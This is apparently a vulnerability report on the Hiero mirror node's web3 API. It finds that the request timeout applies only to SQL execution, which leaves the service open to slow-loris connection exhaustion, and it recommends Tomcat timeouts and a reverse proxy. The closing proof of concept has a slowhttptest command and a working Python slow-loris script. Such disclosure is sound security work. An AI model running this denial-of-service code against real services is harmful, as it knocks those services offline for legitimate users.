### Title
Slow-Loris Connection Exhaustion via Per-Request-Only `requestTimeout` with No HTTP-Level Connection or Read Timeout

### Summary
`Web3Properties.requestTimeout` (default 10 s) is enforced exclusively inside a Hibernate `StatementInspector` — it fires only when a SQL statement is about to execute. No HTTP-level read timeout, connection timeout, or keep-alive timeout is configured for the web3 Spring Boot server. An unprivileged attacker can open many persistent HTTP connections and trickle request bytes slowly (slow-loris style), holding Tomcat worker threads indefinitely without ever triggering the SQL-level timeout, exhausting the thread/connection pool and denying service to legitimate callers.

### Finding Description
**Code path — timeout enforcement:**
`web3/src/main/java/org/hiero/mirror/web3/config/HibernateConfiguration.java`, `statementInspector()`, lines 31–47:

```java
StatementInspector statementInspector() {
    long timeout = web3Properties.getRequestTimeout().toMillis();   // 10 000 ms
    return sql -> {
        if (!ContractCallContext.isInitialized()) { return sql; }
        var startTime = ContractCallContext.get().getStartTime();
        long elapsed = System.currentTimeMillis() - startTime;
        if (elapsed >= timeout) {
            throw new QueryTimeoutException("Transaction timed out after %s ms".formatted(elapsed));
        }
        return sql;
    };
}
```

The timeout check is a Hibernate callback that runs only when Hibernate is about to send a SQL statement to the database. It is never invoked during:
- HTTP connection establishment
- HTTP request-header reading
- HTTP request-body reading
- EVM bytecode execution (no SQL involved)

**Root cause:** The codebase has no `server.tomcat.connection-timeout`, `server.tomcat.keep-alive-timeout`, `server.tomcat.max-connections` (beyond the Spring Boot default of 8 192), or any Netty `readTimeout`/`idleTimeout` configured anywhere under `web3/src/main/resources/` (that directory contains only `banner.txt`).

**Existing throttle is insufficient:** `ThrottleManagerImpl.throttle()` (lines 37–48) consumes from the `rateLimitBucket` (default 500 req/s), but this code path is reached only after the HTTP request body has been fully read and dispatched to the controller. A slow-loris attacker never reaches this point.

**Exploit flow:**
1. Attacker opens N HTTP/1.1 connections to the web3 port (default 8080).
2. Each connection sends a valid POST to `/api/v1/contracts/call` with `Content-Length: X` but delivers body bytes at ~1 byte/second.
3. Tomcat assigns a worker thread to each connection to read the request body.
4. No HTTP read timeout fires (none configured); `requestTimeout` never fires (no SQL executed yet).
5. Worker threads are held until Tomcat's `maxThreads` (default 200) or `maxConnections` (default 8 192) is exhausted.
6. Legitimate requests queue in the `acceptCount` backlog (default 100) and then are refused with connection-reset.

### Impact Explanation
Complete denial-of-service of the web3 JSON-RPC API. All `eth_call`, `eth_estimateGas`, and related endpoints become unavailable to legitimate users. Because the web3 module is the Ethereum-compatible entry point for contract simulation and transaction submission, this blocks any client relying on that interface. The attack requires no authentication, no special payload, and no knowledge of contract addresses.

### Likelihood Explanation
Slow-loris is a well-documented, trivially scriptable attack (e.g., `slowloris.py`, `hping3`). The attacker needs only network access to port 8080 (or whatever the exposed port is). No credentials, no tokens, no privileged account. The attack is repeatable and sustainable indefinitely. The default Tomcat `maxThreads=200` means only 200 slow connections are needed to saturate the thread pool entirely.

### Recommendation
1. **Set an HTTP read timeout** in `application.yml` (or equivalent):
   ```yaml
   server:
     tomcat:
       connection-timeout: 5000        # ms to read the full request
       keep-alive-timeout: 15000       # ms idle keep-alive
       max-connections: 2000           # reduce from default 8192
       accept-count: 50
   ```
   For Netty (reactive stack): configure `server.netty.connection-timeout` and `server.netty.idle-timeout`.

2. **Deploy a reverse proxy** (nginx/Envoy/HAProxy) in front of the web3 service with `client_body_timeout` and `client_header_timeout` set (e.g., 5 s), which is the standard mitigation for slow-loris at the infrastructure layer.

3. **Extend `requestTimeout` semantics** to cover the full HTTP request lifecycle, not just the SQL execution phase, by registering a `HandlerInterceptor` or `WebFilter` that enforces a hard deadline from the moment the request is accepted.

### Proof of Concept
```bash
# Requires: slowhttptest (apt install slowhttptest)
slowhttptest -c 500 -H -g -o output -i 10 -r 200 -t POST \
  -u http://<web3-host>:8080/api/v1/contracts/call \
  -p 3 -l 120
# -c 500  : 500 concurrent connections
# -H      : slow headers mode (also works with -B for slow body)
# -i 10   : send 1 byte every 10 seconds
# -l 120  : run for 120 seconds
# Expected: after ~200 connections, legitimate requests receive TCP RST or timeout
```

Alternatively, with Python:
```python
import socket, time, threading

def slow_loris(host, port, n=300):
    socks = []
    for _ in range(n):
        s = socket.socket()
        s.connect((host, port))
        # Send partial HTTP request — never complete the body
        s.send(b"POST /api/v1/contracts/call HTTP/1.1\r\n"
               b"Host: target\r\nContent-Type: application/json\r\n"
               b"Content-Length: 1000\r\n\r\n{")
        socks.append(s)
    while True:
        for s in socks:
            try: s.send(b"a")   # trickle 1 byte to keep connection alive
            except: pass
        time.sleep(9)           # stay under any hypothetical 10s idle timer

threading.Thread(target=slow_loris, args=("web3-host", 8080)).start()
```
